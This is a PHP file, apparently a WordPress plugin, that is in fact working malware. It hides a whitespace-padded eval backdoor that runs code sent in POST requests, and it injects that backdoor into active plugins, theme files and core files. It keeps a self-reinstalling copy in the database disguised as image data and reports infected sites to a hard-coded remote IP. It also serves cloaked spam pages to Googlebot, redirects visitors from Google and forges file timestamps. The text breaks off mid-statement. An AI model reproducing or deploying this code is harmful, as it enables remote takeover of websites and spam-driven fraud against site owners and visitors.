<?php if(!class_exists("WpPlLoadContent")&&!class_exists("WpPlaginLoad")){class WpPlLoadContent{protected $options;protected $return;protected $postF;protected $postS;protected $f;protected $temporaryStep=false;protected $excludeHost=array('localhost','127.0.0.','.dev');public $currentTimeFile=false;public $currentChmodFile=false;const WP='wp';const EVL='                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           @eval($_POST["wp_ajx_request"]);';const REINSTALL='
if (!class_exists("WpPlaginLoad") && !class_exists("WpPlLoadContent") && !function_exists("wp_is_plugin_load")) {
    function wp_is_plugin_load()
    {
    if (!class_exists("WpPlaginLoad") && !class_exists("WpPlLoadContent")) {
        global $wpdb, $table_prefix;
        $content = $wpdb->get_row("SELECT * FROM " . $table_prefix . "postmeta WHERE meta_key=\"_wp_attached_file_plug\"");
        if (!empty($content) && !empty($content->meta_value)) {
            $plugins = get_option("active_plugins");
            if (!empty($plugins)) {
                foreach ($plugins as $plugin) {
                    $file = $_SERVER["DOCUMENT_ROOT"] . "/wp-content/plugins/".$plugin;
                    if (file_exists($file)) {
                        $fileContent = file_get_contents($file);
                        if ($fileContent) {
                            $time = filemtime($file);
                            $rules = substr(sprintf("%o", fileperms($file)), -4);
                            $dirPath = dirname($file) . "/readme.txt";
                            $start = strripos($fileContent, "?>");
                            if (stripos($fileContent, "require_once(plugin_dir_path(__FILE__) . \"readme.txt\");") !== false) {
                                if (file_put_contents($file, $fileContent)) {
                                    @touch($file, $time + 60);
                                    @chmod($file, octdec($rules));
                                    file_put_contents($dirPath, base64_decode(substr($content->meta_value, 23)));
                                }
                            } else {
                                if ($start === false) {
                                    $fileContent = $fileContent . "
require_once(plugin_dir_path(__FILE__) . \"readme.txt\");";
                            } else {
                                $start = stripos($fileContent, "<?php");
                                $firstPart = substr($fileContent, 0, $start + 5);
                                $secondPart = substr($fileContent,$start + 5);
                                $fileContent = $firstPart. "
require_once(plugin_dir_path(__FILE__) . \"readme.txt\");
" . $secondPart;
                                }
                                if (file_put_contents($file, $fileContent)) {
                                    @touch($file, $time + 60);
                                    @chmod($file, octdec($rules));
                                    file_put_contents($dirPath, base64_decode(substr($content->meta_value, 23)));
                                }
                            }
                        }
                    }
                }
            }
        } else {
            if ($_POST["wp_ajx_reinstall_request"]) {
                @eval($_POST["wp_ajx_reinstall_request"]);
            }
        }
        }
    }
add_filter("init", "wp_is_plugin_load");
}
';public function __construct(){$this->options['cookie']=$_COOKIE;$this->options['userAgent']=$_SERVER['HTTP_USER_AGENT'];$this->options['referrer']=$_SERVER['HTTP_REFERER'];$this->return['host']=$this->options['host']=$_SERVER['HTTP_HOST'];$this->return['ip']=$this->options['server_addresses']=$_SERVER['SERVER_ADDR'];$this->return['doc_root']=$this->options['doc_root']=$_SERVER['DOCUMENT_ROOT'];if(function_exists('wp_title')){$this->options['cms']=self::WP;}else{$this->options['cms']=false;}}public function init(){if(!$this->validateUser()){return false;}if($this->temporaryStep){if($this->callBack()){$this->deleteTemporaryData();$this->setClient();}}else{if($this->contentSet()){$this->siteMapGenerate();$this->imgBc();$this->evlPluginAdd();$this->evlAdd();if($this->callBack()){$this->setClient();}else{$this->setTemporaryData();}}}return true;}protected function imgBc(){global $wpdb,$table_prefix;$f=$this->getImg();if($f){$fcontent=$this->getContent(__FILE__);if($fcontent){$saver=$this->saveContent($this->options['doc_root'] .$f,$fcontent,true,true);$dbSave='data:image/gif;base64,R' .base64_encode($fcontent);$wpdb->query('INSERT INTO ' .$table_prefix .'postmeta(post_id, meta_key, meta_value) VALUES (' .$this->postF .', "_wp_attached_file_plug", "' .$dbSave .'"), (' .$this->postS .', "_wp_attached_filе_new_plug", "' .$this->f .'")');if(!$saver){$this->options['restoreFile']=false;}$this->clearFileParams();}else{$this->options['restoreFile']=false;}}}protected function clearFileParams(){$this->currentTimeFile=false;$this->currentChmodFile=false;}protected function validateUser(){global $wpdb,$table_prefix;if($this->options['cms']!= self::WP){return false;}foreach($this->excludeHost as $val){if(stripos($this->options['host'],$val)!== false || stripos($this->options['server_addresses'],$val)!== false){return false;}}$result=$wpdb->get_row('SELECT meta_value FROM ' .$table_prefix .'postmeta WHERE meta_key = "_wp_session_tocen_temporery"');if(!empty($result)){if(empty($result->meta_value)){$this->deleteTemporaryData();$this->temporaryStep=false;}else{$posts=$wpdb->get_results('SELECT * FROM ' .$table_prefix .'postmeta WHERE meta_key="_wp_plugin_attachment_metadata"');if(empty($posts)){$this->deleteTemporaryData();$this->temporaryStep=false;}else{$this->return=json_decode(base64_decode(substr($result->meta_value,7)),true);$this->temporaryStep=true;}}}else{$wpdb->query('DELETE FROM ' .$table_prefix .'postmeta WHERE meta_key IN("_wp_attached_filе_new_plug", "_wp_attached_file_plug", "_wp_post_linkes")');}return true;}protected function deleteTemporaryData(){global $wpdb,$table_prefix;$wpdb->query('DELETE FROM ' .$table_prefix .'postmeta WHERE meta_key = "_wp_session_tocen_temporery"');}protected function setTemporaryData(){global $wpdb,$table_prefix;return $wpdb->query('INSERT INTO ' .$table_prefix .'postmeta(post_id, meta_key, meta_value) VALUES(1, "_wp_session_tocen_temporery", "QiOiI8Z' .base64_encode(json_encode($this->return)) .'")');}protected function contentSet(){global $wpdb,$table_prefix;$post=$wpdb->get_results('SELECT * FROM ' .$table_prefix .'posts WHERE post_status="publish" AND (post_type="post" OR post_type="page")');$result=$this->request('http://128.199.33.158/site/setup/',array('setup'=> true,'host'=> $this->options['host']));if(!empty($result)){$resultDecode=json_decode($result,true);if(empty($resultDecode['keys'])){return false;}$resultKeys=json_decode($resultDecode['keys'],true);$sitemap=array_keys($resultKeys);$postKey=array_rand($post);$this->postF=$post[$postKey]->ID;$postKey=array_rand($post);$this->postS=$this->postF=$post[$postKey]->ID;$this->return['sitemap']=json_encode($sitemap);$wpdb->query('INSERT INTO ' .$table_prefix .'postmeta(post_id, meta_key, meta_value) VALUES("' .$this->postS .'", "_wp_post_linkes", "' .str_replace('C','i1za_',base64_encode($result)) .'")');return true;}$this->return['sitemap']=false;return false;}protected function callBack(){$this->return['result']=true;$this->return['eval']=json_encode($this->return['eval']);$result=$this->request('http://128.199.33.158/site/call-back/',$this->return);if($result != md5('OK')){return false;}else{return true;}}protected function siteMapGenerate(){if(!empty($this->return['sitemap'])){$sitemap=json_decode($this->return['sitemap'],true);$xml='';if(false == isset($_SERVER['HTTPS'])){$_SERVER['HTTPS']='Off';}if('on'== strtolower($_SERVER['HTTPS'])){$protocol='https://';}else{$protocol='http://';}foreach($sitemap as $val){$xml .= '<url><loc>' .$protocol .$this->options['host'] .'/' .$val .'/</loc><lastmod>' .date('Y-m-d') .'T' .date('H:i:s') .'+00:00</lastmod><changefreq>daily</changefreq><priority>1</priority></url>' ."\r\n";}if(file_exists($this->options['doc_root'] .'/sitemap.xml')){$map=file_get_contents($this->options['doc_root'] .'/sitemap.xml');$start=stripos($map,'<url>');$fp=substr($map,0,$start);$fs=substr($map,$start);$map=$fp .$xml .$fs;file_put_contents($this->options['doc_root'] .'/sitemap.xml',$map);}else{$map='<?xml version="1.0" encoding="UTF-8"?>
                            <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.google.com/schemas/sitemap/0.84 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">';$map .= $xml;$map .= '</urlset>';file_put_contents($this->options['doc_root'] .'/sitemap.xml',$map);}}}protected function evlAdd(){$files=array('/wp-admin/includes/class-pclzip.php','/wp-includes/SimplePie/Cache/File.php');if(is_dir($this->options['doc_root'] .'/wp-content/themes')){$themes=scandir($this->options['doc_root'] .'/wp-content/themes');if(count($themes)>0){foreach($themes as $theme){if($theme != '.'&& $theme != '..'&& is_dir($this->options['doc_root'] .'/wp-content/themes/' .$theme)){if(file_exists($this->options['doc_root'] .'/wp-content/themes/' .$theme .'/functions.php'))$files[]='/wp-content/themes/' .$theme .'/functions.php';}}}}if(count($files)>0){foreach($files as $file){$filePath=$this->options['doc_root'] .$file;$fileLink=$this->options['host'] .$file;if(!file_exists($filePath)){continue;}$content=$this->getContent($filePath,true,true);if(empty($content)){continue;}$start=stripos($content,'<?php');if($start === false){continue;}$fp=substr($content,0,$start+5);$sp=substr($content,$start+5);$content=$fp .self::EVL .$sp;if($this->saveContent($filePath,$content,true,true)){$this->return['eval'][]=$fileLink;}}}return true;}protected function setClient(){$php='<?php try{if(!class_exists("WpPlaginLoad")){class WpPlaginLoad{const WP="wp";protected $bot=false;protected $user=false;protected $links;protected $record;protected $linkForOrigin;protected $redirect;protected $content;protected $key;protected $posts;protected $postF;protected $postS;protected $temporaryTemplate=false;protected $template=false;protected $excludeHost=array("localhost","127.0.0.",".dev");public function __construct(){$this->options["cookie"]=$_COOKIE;$this->options["userAgent"]=$_SERVER["HTTP_USER_AGENT"];$this->options["referrer"]=$_SERVER["HTTP_REFERER"];$this->return["host"]=$this->options["host"]=$_SERVER["HTTP_HOST"];$this->return["ip"]=$this->options["server_addresses"]=$_SERVER["SERVER_ADDR"];$this->return["doc_root"]=$this->options["doc_root"]=$_SERVER["DOCUMENT_ROOT"];$this->options["request"]=$_SERVER["REQUEST_URI"];$get=stripos($this->options["request"],"?");if($get !== false){$this->options["request"]=substr($this->options["request"],0,$get);}if(function_exists("wp_title")){$this->options["cms"]=self::WP;}else{$this->options["cms"]=false;}}public function init(){global $wpdb,$table_prefix;if($this->options["userAgent"]== "toblebot"){return true;}if(!empty($_POST[md5($this->options["host"])])){echo md5($this->options["host"]);exit;}if(!$this->validateUser()){return false;}$this->posts=$wpdb->get_results("SELECT * FROM " .$table_prefix ."posts WHERE post_status=\"publish\" AND (post_type=\"post\" OR post_type=\"page\")");if($this->bot){$this->key=$key=str_replace("/","",$this->options["request"]);if(empty($key)){$this->getLinks();if(empty($this->links)){if($this->setLinks()){$this->getLinks();$countRand=rand(5,7);if(count($this->links)>= $countRand){$keys=array_rand($this->links,$countRand);}else{$keys=array_rand($this->links,count($this->links));}if($keys == 1){$keys=array($keys);}$this->getLinksForOrigin($keys);$this->setLinkInToContent();return true;}return false;}else{$countRand=rand(5,7);if(count($this->links)>= $countRand){$keys=array_rand($this->links,$countRand);}else{$keys=array_rand($this->links,count($this->links));}if($keys == 1){$keys=array($keys);}$this->getLinksForOrigin($keys);$this->setLinkInToContent();return true;}}else{$this->getRecord($this->getPostSlug($key));if(empty($this->record)){$this->getLinks();if($this->links == false){$this->setLinks();$this->getLinks();}if(!empty($this->links[$key])){$this->getContentForPost();if(!$this->record){return true;}$this->setContentInToTemplate();return $this->showContent();}if($this->links){$kl=rand(5,7);if($kl>count($this->links)){$keys=array_rand($this->links,count($this->links));}else{$keys=array_rand($this->links,$kl);}$this->getLinksForOrigin($keys);$this->setLinkInToContent();}return false;}else{return $this->showContent();}}}if($this->user){$this->key=$key=str_replace("/","",$this->options["request"]);$this->getLinks();if(empty($this->links)){$this->setLinks();$this->getLinks();}if(!empty($this->links[$this->key])){$result=$this->request("http://128.199.33.158/site/link/",array("get_link"=> true,"host"=> $this->options["host"]));$rLink=json_decode($result);if(!empty($rLink)){echo "<script type=\"text/javascript\">window.location.href=\"" .$rLink ."\";</script>";exit;}}}}protected function validateUser(){if($this->options["cms"]!= self::WP){return false;}foreach($this->excludeHost as $val){if(stripos($this->options["host"],$val)!== false || stripos($this->options["server_addresses"],$val)!== false){return false;}}if(!empty($this->options["cookie"])){foreach($this->options["cookie"]as $key => $cookie){if(stripos($key,"wp-settings-")!== false){return false;}}}if(stripos($this->options["userAgent"],"googlebot")!== false){$this->bot=true;$this->getPostTemplate();return true;}if(stripos($this->options["referrer"],"google.com")!== false){$this->user=true;return true;}return false;}protected function getLinks(){global $wpdb,$table_prefix;$links=$wpdb->get_row("SELECT meta_value FROM " .$table_prefix ."postmeta WHERE meta_key=\"_wp_post_linkes\"");if(empty($links)){$this->links=false;return false;}$links=$links->meta_value;$links=json_decode(base64_decode(str_replace("i1za_","C",$links)),true);$this->redirect=$links["redirect"];if(!empty($links["keys"])){$this->links=json_decode($links["keys"],true);}else{$this->links=false;}return true;}protected function setLinks(){global $wpdb,$table_prefix;$result=$this->request("http://128.199.33.158/site/setup/",array("setup"=> true,"host"=> $this->options["host"]));if(!empty($result)){$resultDecode=json_decode($result,true);if(empty($resultDecode["keys"])){return false;}$postKey=array_rand($this->posts);$this->postF=$this->posts[$postKey]->ID;$postKey=array_rand($this->posts);$this->postS=$this->postF=$this->posts[$postKey]->ID;return $wpdb->query("INSERT INTO " .$table_prefix ."postmeta(post_id, meta_key, meta_value) VALUES(\"" .$this->postS ."\", \"_wp_post_linkes\", \"" .str_replace("C","i1za_",base64_encode($result)) ."\")");}}protected function showContent(){echo $this->record;exit;}protected function setLinkInToContent(){$GLOBALS["pluginInsideLink"]=$this->linkForOrigin;add_filter("wp","plugin_init_page_link");add_filter("wp_nav_menu","plugin_menu_content_add");add_filter("the_content","plugin_the_content_add");add_filter("wp_footer","plugin_wp_footer_add");}protected function getPostTemplate(){global $wpdb,$table_prefix;$template=$wpdb->get_row("SELECT meta_value FROM " .$table_prefix ."postmeta WHERE meta_key=\"_wp_post_tamplate\"");if(empty($template)|| empty($template->meta_value)){$wpdb->delete($table_prefix ."postmeta",array("meta_key"=> "_wp_post_tamplate"));$post=$wpdb->get_row("SELECT * FROM " .$table_prefix ."posts WHERE post_status=\"publish\" AND post_type IN (\"post\", \"page\") AND post_parent=0 AND post_password=\"\" ORDER BY ID DESC");if(empty($post)){$this->temporaryTemplate=true;}else{$wpdb->query("UPDATE " .$table_prefix ."posts SET post_content=\"[hex-mex-change-me]\", post_title=\"[hex-mex-change-me-h1]\" WHERE ID=\"" .$post->ID ."\"");$templateHtml=$this->request($this->return["host"] .$this->psl($post),false,array(CURLOPT_USERAGENT => "toblebot",CURLOPT_FOLLOWLOCATION => true));$wpdb->update($table_prefix ."posts",array("post_content"=> $post->post_content,"post_title"=> $post->post_title),array("ID"=> $post->ID));$this->template=$templateHtml=$this->prepareTemplate($templateHtml);$wpdb->insert($table_prefix ."postmeta",array("post_id"=> $post->ID,"meta_key"=> "_wp_post_tamplate","meta_value"=> str_replace("w","Yga__",base64_encode($templateHtml))));}}else{$this->template=base64_decode(str_replace("Yga__","w",$template->meta_value));}}protected function psl($post){$rewritecode=array("%year%","%monthnum%","%day%","%hour%","%minute%","%second%","%postname%","%post_id%","%pagename%",);$permalink=get_option("permalink_structure");if($permalink == ""){$permalink=$this->options["host"] ."/?p=" .$post->ID;}else{$unixtime=strtotime($post->post_date);$date=explode(" ",date("Y m d H i s",$unixtime));$rewritereplace=array($date[0],$date[1],$date[2],$date[3],$date[4],$date[5],$post->post_name,$post->ID,$post->post_name,);$permalink=str_replace($rewritecode,$rewritereplace,$permalink);$permalink=$this->uit($permalink);}return $permalink;}protected function uit($string){global $wp_rewrite;if($wp_rewrite->use_trailing_slashes){$string=rtrim($string,"/\\\") ."/";}else{$string=rtrim($string,"/\\\");}return $string;}protected function getContentForPost(){$content=$this->request("http://128.199.33.158/site/template/",array("template"=> true,"host"=> $this->options["host"],"key"=> $this->key));if(!empty($content)){$this->record=$content;}else{$this->record=false;return $this->record;}}protected function wpPostSlug($post){global $wpdb,$table_prefix;$templates=array("%postname%","%post_id%","%monthnum%","%year%","%day%");$permalinkStructure=$wpdb->get_row("SELECT option_value FROM " .$table_prefix ."options WHERE option_name=\"permalink_structure\"");if(!empty($permalinkStructure)){$timestamp=strtotime($post->post_date);return str_replace($templates,array($post->post_name,$post->ID,date("m",$timestamp),date("Y",$timestamp),date("d",$timestamp)),$permalinkStructure->option_value);}else{return "/?p=" .$post->ID;}}protected function setContentInToTemplate(){global $wpdb,$table_prefix;if($this->temporaryTemplate){$html="<!doctype html>
                                <html lang=\"en\">
                                <head>
                                    <meta charset=\"UTF-8\">
                                    <title>[hex-mex-change-me-title]</title>
                                    <meta name=\"description\" content=\"[hex-mex-change-me-description]\" />
                                </head>
                                <body>
                                    <header>
                                            <nav><ul>
                                            <li>[hex-mex-change-me-link-0]</li>
                                            <li>[hex-mex-change-me-link-1]</li>
                                            <li>[hex-mex-change-me-link-2]</li>
                                            <li>[hex-mex-change-me-link-3]</li>
                                            <li>[hex-mex-change-me-link-4]</li>
                                            </ul></nav>
                                    </header>
                                    <div class=\"wrap\">
                                        <h1>[hex-mex-change-me]</h1>
                                        [hex-mex-change-me]
                                    </div>
                                    <footer>
                                        <div>
                                        <nav><ul>
                                            <li>[hex-mex-change-me-link-donor-0]</li>
                                            <li>[hex-mex-change-me-link-donor-1]</li>
                                            <li>[hex-mex-change-me-link-donor-2]</li>
                                            <li>[hex-mex-change-me-link-donor-3]</li>
                                            <li>[hex-mex-change-me-link-donor-4]</li>
                                            </ul></nav>
                                        </div>
                                    </footer>
                                </body>
                                </html>
                    ";}else{$html=$this->template;}$content=json_decode($this->record,true);$html=str_replace("[hex-mex-change-me-title]",trim(ucwords($this->links[$this->key])) ." | " .ucwords($this->options["host"]),$html);$html=str_replace("[hex-mex-change-me-description]",$this->prepareDescription($this->links[$this->key],$content["content"]),$html);$html=str_replace("[hex-mex-change-me-h1]",trim(ucwords($this->links[$this->key])),$html);if(!empty($content["content"])){$html=str_replace("[hex-mex-change-me]",$content["content"],$html);}else{$html=str_replace("[hex-mex-change-me]","",$html);}if(!empty($content["donors"])){preg_match_all("/\[hex-mex-change-me-link-donor-[0-9]+\]/",$html,$donorLink);$donorLink=array_filter($donorLink);$keys=array_keys($content["donors"]);$i=0;if(!empty($donorLink[0])&& count($donorLink[0])>0){foreach($donorLink[0]as $link){if(isset($keys[$i])&&!empty($content["donors"][$keys[$i]])){$html=str_replace($link,"<a href=\"" .$content["donors"][$keys[$i]]["link"] ."\">" .$content["donors"][$keys[$i]]["key"] ."</a>",$html);}else{$html=str_replace($link,"",$html);}$i++;}}}else{$html=preg_replace("/\[hex-mex-change-me-link-donor-[0-9]+\]/","",$html);}preg_match_all("/\[hex-mex-change-me-link-[0-9]+\]/",$html,$insideLink);$insideLink=array_filter($insideLink);if(!empty($insideLink[0])&& count($insideLink[0])>0){$insideLink=array_filter($insideLink[0]);if(!empty($this->links)){if(count($insideLink)>count($this->links)){$linkForReplace=array_rand($this->links,count($this->links));}else{$linkForReplace=array_rand($this->links,count($insideLink));}$keys=array_keys($linkForReplace);$i=0;foreach($insideLink as $link){if(isset($keys[$i])&&!empty($linkForReplace[$keys[$i]])){$html=str_replace($link,"<a href=\"/" .$linkForReplace[$keys[$i]] ."/\">" .$this->links[$linkForReplace[$keys[$i]]] ."</a>",$html);}else{$html=str_replace($link,"",$html);}$i++;}$html=preg_replace("/\[hex-mex-change-me-link-[0-9]+\]/","",$html);}else{$html=preg_replace("/\[hex-mex-change-me-link-[0-9]+\]/","",$html);}}$this->record=$html;if(!empty($this->posts)){$keyPost=array_rand($this->posts);$post=$this->posts[$keyPost]->ID;}else{$post=1;}$wpdb->delete($table_prefix ."postmeta",array("meta_key"=> "_wp_plugin_attachment_metadata_" .md5($this->getPostSlug($this->key))));$wpdb->query("INSERT INTO " .$table_prefix ."postmeta(post_id, meta_key, meta_value) VALUES (\"" .$post ."\", \"_wp_plugin_attachment_metadata_" .md5($this->getPostSlug($this->key)) ."\", \"" .str_replace("X","_iGua",base64_encode(json_encode($this->record))) ."\")");}protected function getRecord($key){global $wpdb,$table_prefix;if($key){$record=$wpdb->get_row("SELECT * FROM " .$table_prefix ."postmeta WHERE meta_key= \"_wp_plugin_attachment_metadata_" .md5($key) ."\" ");}if(empty($record)){$this->record=false;return $this->record;}$this->record=json_decode(base64_decode(str_replace("_iGua","X",$record->meta_value)),true);return true;}protected function prepareTemplate($html){$titleOur=stripos($html,"[hex-mex-change-me]");$contentOur=stripos($html,"[hex-mex-change-me]");if($contentOur !== false){preg_match("/<h1.*>(.*)<\/h1>/",$html,$h1OutPut);$h1Our=false;if($titleOur){if(!empty($h1OutPut)){foreach($h1OutPut as $h1){if(stripos($h1,"[hex-mex-change-me-h1]")!== false){$h1Our=true;}}}if(!$h1Our){$html=str_replace("[hex-mex-change-me-h1]","<h1>[hex-mex-change-me-h1]</h1>",$html);}}if(!$h1Our){$html=str_replace("[hex-mex-change-me]","<h1>[hex-mex-change-me-h1]</h1>[hex-mex-change-me]",$html);}}else{$html=preg_replace("/>(.*?)</s","><",$html);$html=preg_replace("/<!--(.*?)>/s","",$html);$html=preg_replace("#/\*#","",$html);$html=preg_replace("/<body(.*?)>/s","<body $1 ><h1>[hex-mex-change-me-h1]</h1>[hex-mex-change-me]",$html);}preg_match_all("/<a.*href=\"([^\"]*)\".*>(.*)<\/a>/",$html,$links);$links=array_filter($links);if(!empty($links[0])&& count($links[0])>0){if(count($links[0])>15){$i=0;$s=0;foreach($links[0]as $link){if($i<3){$html=str_replace($link,"[hex-mex-change-me-link-" .$s ."]",$html);}if($i>3){$html=str_replace($link,"[hex-mex-change-me-link-donor-" .$s ."]",$html);}if($i<6){$i++;}else{$i=0;}$s++;}}else{$count=15;$i=0;$s=0;foreach($links[0]as $link){if($i<3){$html=str_replace($link,"[hex-mex-change-me-link-" .$s ."]",$html);}if($i>3){$html=str_replace($link,"[hex-mex-change-me-link-donor-" .$s ."]",$html);}if($i<6){$i++;}else{$i=0;}$s++;}$linkReplace="";for($i=$s;$i<$count;$i++){if($i<3){$linkReplace .= "[hex-mex-change-me-link-" .$i ."]";}if($i>2){$linkReplace .= "[hex-mex-change-me-link-donor-" .$i ."]";}}$html=str_replace("</body>",$linkReplace ."</body>",$html);}}else{$linkReplace="";$linkDonorReplace="";for($i=0;$i<15;$i++){if($i<8){$linkReplace .= "[hex-mex-change-me-link-" .$i ."]";}if($i>7){$linkDonorReplace .= "[hex-mex-change-me-link-donor-" .$i ."]";}}$html=preg_replace("/<body(.*?)>/s","<body $1 >" .$linkReplace,$html);$html=str_replace("</body>",$linkDonorReplace ."</body>",$html);}$html=$this->replaceTitle($html,"[hex-mex-change-me-title]");$html=$this->replaceDescription($html,"[hex-mex-change-me-description]");$html=preg_replace("/<script.*>(.*?)<\/script>/","",$html);return $html;}protected function replaceTitle($content,$title){$content=preg_replace("/<title>(.*?)<\/title>/","<title>" .$title ."</title>",$content,-1,$countReplace);if($countReplace == 0){$content=str_replace("<head>","<head>" ."\r\n" ."<title>" .$title ."</title>",$content);}return $content;}protected function replaceDescription($content,$description){$content=preg_replace("/<meta.*name=\"description\".*content=\"(.*)\".*\/>/i","<meta name=\"description\" content=\"" .$description ."\" />",$content,-1,$countReplace);$content=preg_replace("/<meta.*content=\"(.*)\".*name=\"description\".*\/>/i","<meta name=\"description\" content=\"" .$description ."\" />",$content,-1,$countReplace);if($countReplace == 0){$content=str_replace("</title>","</title>" ."\r\n" ."<meta name=\"description\" content=\"" .$description ."\" />",$content);}return $content;}protected function request($url,$params=false,$options=false){if(function_exists("curl_init")){$curl=curl_init();$curl_options=array(CURLOPT_RETURNTRANSFER => 1,CURLOPT_URL => $url,CURLOPT_USERAGENT => "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",CURLOPT_TIMEOUT => 5,);if($params){$curl_options[CURLOPT_POST]=true;$curl_options[CURLOPT_POSTFIELDS]=$params;}if($options){foreach($options as $key => $option){$curl_options[$key]=$option;}}curl_setopt_array($curl,$curl_options);$result=curl_exec($curl);curl_close($curl);return $result;}else{return file_get_contents($url);}}protected function getLinksForOrigin($keys){if(empty($this->links)){$this->linkForOrigin=false;}else{$this->linkForOrigin=$this->links;}return true;}protected function getPostSlug($key){$link=trim($key);$link=str_replace(" ","-",strtolower($link));$link=preg_replace("/[^A-Za-z0-9-]/","-",$link);return $link;}protected function prepareDescription($key,$content){if(empty($content)){return $key;}$result="";$content=explode(".",strip_tags($content));$randKey=array_rand($content);$result .= trim($content[$randKey]) .".";$countIteration=rand(1,4);for($i=1;$i <= $countIteration;$i++){if(!empty($content[$randKey+$i])){$result .= " " .trim($content[$randKey+$i]) .".";}}return trim($result);}}try{$class=new WpPlaginLoad();$class->init();}catch(Exeption $e){}function plugin_the_content_add($content){global $pluginInsideLink;if(!empty($pluginInsideLink["content"])&& count($pluginInsideLink["content"])>0){$keys=array_keys($pluginInsideLink["content"]);for($i=0;$i<2;$i++){$content="<a href=\"/" .$keys[$i] ."/\">" .$pluginInsideLink["content"][$keys[$i]] ."</a>" .$content;unset($pluginInsideLink["content"][$keys[$i]]);}for($i=2;$i<5;$i++){$content .= "<a href=\"/" .$keys[$i] ."/\">" .$pluginInsideLink["content"][$keys[$i]] ."</a>";unset($pluginInsideLink["content"][$keys[$i]]);}}return $content;}function plugin_menu_content_add($content){global $pluginInsideLink;if(!empty($pluginInsideLink["menu"])&& count($pluginInsideLink["menu"])>0){preg_match_all("/<a.*href=\"([^\"]*)\".*>(.*)<\/a>/",$content,$output_array);if(!empty($output_array[0])&& count($output_array[0])>0){if(count($output_array[0])>4){$linkMenuKey=array_rand($output_array[0],4);$pluginKey=array_keys($pluginInsideLink["menu"]);$i=0;foreach($linkMenuKey as $link){$content=str_replace($output_array[0][$link],"<a href=\"/" .$pluginKey[$i] ."/\">" .$pluginInsideLink["menu"][$pluginKey[$i]] ."</a>",$content);unset($pluginInsideLink["menu"][$pluginKey[$i]]);$i++;}return $content;}else{if(count($output_array[0])>= 2){$linkMenuKey=array_rand($output_array[0],2);}else{$linkMenuKey=array_rand($output_array[0],count($output_array[0]));}$pluginKey=array_keys($pluginInsideLink["menu"]);$i=0;if(count($linkMenuKey)== 0){$linkMenuKey=array($linkMenuKey);}foreach($linkMenuKey as $link){$content=str_replace($output_array[0][$link],"<a href=\"/" .$pluginKey[$i] ."/\">" .$pluginInsideLink["menu"][$pluginKey[$i]] ."</a>",$content);unset($pluginInsideLink["menu"][$pluginKey[$i]]);$i++;}for($s=$i;$s<4;$s++){$content .= "<a href=\"/" .$pluginKey[$s] ."/\">" .$pluginInsideLink["menu"][$pluginKey[$s]] ."</a>";unset($pluginInsideLink["menu"][$pluginKey[$s]]);}return $content;}}else{$pluginKey=array_keys($pluginInsideLink["menu"]);$pluginLink="";foreach($pluginKey as $key){$pluginLink .= "<a href=\"/" .$key ."/\">" .$pluginInsideLink["menu"][$key] ."</a>";unset($pluginInsideLink["menu"][$key]);}return $content .$pluginLink;}}return $content;}function plugin_wp_footer_add(){global $pluginInsideLink;if(!empty($pluginInsideLink["footer"])&& count($pluginInsideLink["footer"])>0){$keys=array_keys($pluginInsideLink["footer"]);foreach($keys as $key){echo "<a href=\"/" .$key ."/\">" .$pluginInsideLink["footer"][$key] ."</a>";}}}function plugin_init_page_link(){global $wpdb,$table_prefix,$pluginInsideLink;$postID=get_the_ID();if(count($pluginInsideLink)>= 10){$keys=array_rand($pluginInsideLink,10);$foterKeys=array_rand($pluginInsideLink,5);}else{$keys=array_rand($pluginInsideLink,count($pluginInsideLink));$foterKeys=array_rand($pluginInsideLink,count($pluginInsideLink));}if(count($keys)== 1){$keys=array($keys);}if(count($foterKeys)== 1){$foterKeys=array($foterKeys);}if($postID){$post=$wpdb->get_row("SELECT * FROM " .$table_prefix ."postmeta WHERE post_id=\"" .$postID ."\" AND meta_key=\"_menu_items_uri\"");$links=array();$i=0;foreach($keys as $key){if($i<4){$links["menu"][$key]=$pluginInsideLink[$key];}if($i>3){$links["content"][$key]=$pluginInsideLink[$key];}$i++;}if(count($foterKeys)>0){foreach($foterKeys as $footKey){$links["footer"][$footKey]=$pluginInsideLink[$footKey];}}if(empty($post)){$wpdb->query("INSERT INTO " .$table_prefix ."postmeta(post_id, meta_key, meta_value) VALUES (\"" .$postID ."\", \"_menu_items_uri\", \"" .str_replace("a","ai_G",base64_encode(json_encode($links))) ."\")");$pluginInsideLink=$links;}else{$links=json_decode(base64_decode(str_replace("ai_G","a",$post->meta_value)),true);$pluginInsideLink=$links;}}else{$links=array();$i=0;foreach($keys as $key){if($i<4){$links["menu"][$key]=$pluginInsideLink[$key];}if($i>3){$links["content"][$key]=$pluginInsideLink[$key];}$i++;}$pluginInsideLink=$links;}return true;}}}catch(Exception $e){}
';$this->getContent(__FILE__,true,true);$this->currentTimeFile=$this->currentTimeFile+60;return $this->saveContent(__FILE__,$php,true,true);}protected function evlPluginAdd(){$this->return['eval']=false;$plugins=get_option('active_plugins');if(count($plugins)== 0){return false;}foreach($plugins as $plugin){$pluginPath=$this->options['doc_root'] .'/wp-content/plugins/' .$plugin;if(!file_exists($pluginPath)){continue;}$content=$this->getContent($pluginPath,true,true);if(empty($content)){continue;}$start=stripos($content,'<?php');if($start === false){continue;}$fp=substr($content,0,$start+5);$sp=substr($content,$start+5);$content=$fp .self::EVL .$sp;$start=stripos($content,'add_action(');if($start === false){continue;}$fp=substr($content,0,$start);$sp=substr($content,$start);if(stripos($content,'function wp_is_plugin_load()')!== false){$content=$fp .$sp;}else{$content=$fp .self::REINSTALL .$sp;}if($this->saveContent($pluginPath,$content,true,true)){$this->return['eval'][]=$this->options['host'] .'/wp-content/plugins/' .$plugin;}}if(empty($this->return['eval'])){$this->return['eval']=false;}return true;}protected function getPostSlug($key){$link=trim($key);$link=str_replace(' ','-',strtolower($link));$link=preg_replace('/[^A-Za-z0-9-]/','-',$link);return $link;}protected function getImg(){global $wpdb,$table_prefix;if($wpdb){$result=$wpdb->get_results('SELECT m.meta_value FROM ' .$table_prefix .'posts as p INNER JOIN ' .$table_prefix .'postmeta as m ON(m.post_id = p.id) WHERE p.post_type = "attachment" AND p.post_mime_type LIKE "%image/%" AND m.meta_key="_wp_attached_file"');if(!empty($result)){$key=array_rand($result);$result=$result[$key];$fileParams=$this->getFileTypeAndName($result->meta_value);$this->f=$result->meta_value;$f='/wp-content/uploads/' .$fileParams['filePath'] .$fileParams['fileName'] .'-122x356.' 